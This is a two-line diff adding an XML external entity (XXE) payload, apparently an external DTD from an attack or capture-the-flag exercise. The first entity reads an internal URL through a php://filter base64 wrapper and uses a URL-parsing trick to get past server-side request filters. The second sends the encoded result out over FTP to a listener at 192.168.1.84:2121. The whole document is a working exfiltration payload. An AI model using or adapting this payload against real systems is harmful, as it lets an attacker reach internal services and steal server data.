@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://hiddenservice:9999/?url=http://127.0.0.1:10000%23@google.com:80/">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://192.168.1.84:2121/%data;'>">
